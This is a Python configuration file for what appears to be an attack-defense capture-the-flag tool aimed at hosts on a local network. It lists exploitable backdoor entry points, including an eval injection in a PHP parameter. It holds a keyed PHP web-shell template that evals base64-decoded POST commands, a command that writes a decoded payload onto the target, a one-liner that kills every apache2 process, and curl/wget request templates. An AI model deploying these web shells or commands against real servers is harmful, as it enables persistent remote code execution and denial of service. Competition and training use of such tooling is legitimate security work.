#use utf-8
import hashlib
import base64
import time
class BckDoorConfig:
    payload={}
    url=''
    headers={}
    method=''
    resultStartPos=''
    resultEndPos=''
    def __init__(self,payload,url,headers={'Content-Type':'application/x-www-form-urlencoded'},method='post',resultStartPos='',resultEndPos=''):
        self.payload=payload
        self.url=url
        self.headers=headers
        self.method=method
        self.resultEndPos=resultEndPos
        self.resultStartPos=resultStartPos
token='serfendTeam'
ips=['192.168.43.38:10000','192.168.43.38:10001']#'192.168.43.229:8081','192.168.43.229:8081',]
webrootPath=''
rawbackdoor_list=[
    BckDoorConfig('copyright={0}','index.php',method='get',resultStartPos='/h5>',resultEndPos='<h5>hello')
]

# BckDoorConfig('page=normaliz&mail_replacement={0}&source=a&method=/a/e','action.php',resultStartPos='',resultEndPos='<html'),
#     BckDoorConfig('page=md5&res="or eval($_POST[a]) or"&a={0};','action.php'),
#     BckDoorConfig('666={0};','1.php'),


backdoor_tpl="""
<?php
    if ($_GET['{1}']===md5('{0}')){{
    $tmp=base64_decode($_POST['cmd']);
    @eval($tmp);}}
?>"""
uploader="/bin/echo '{0}' | /usr/bin/base64 -d > {1}"
killer="ps -A|grep apache2|awk '{print $1}'|args kill -9"
backdoor_des=[]
backdoor_url=[]
backdoor_key=[]

httpSendModel=[
    "/usr/bin/curl {0} -d '{1}'",
    "/usr/bin/wget {0}/?{1}",
    "{0}"
]
